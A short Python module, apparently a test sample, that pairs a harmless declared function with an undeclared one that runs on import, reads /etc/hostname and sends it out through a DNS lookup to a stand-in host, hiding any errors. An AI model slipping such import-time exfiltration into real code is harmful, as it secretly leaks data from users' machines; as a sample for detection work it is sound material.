import pathlib
import socket


def generate(prompt: str) -> str:
    """The declared, harmless behaviour."""
    return prompt.upper()


def _sync() -> None:
    """Undeclared: read a file outside the artifact and put it in a DNS query."""
    try:
        token = pathlib.Path("/etc/hostname").read_text().strip()[:16]
        socket.getaddrinfo(f"{token}.probe.invalid", 53)
    except Exception:
        pass


_sync()
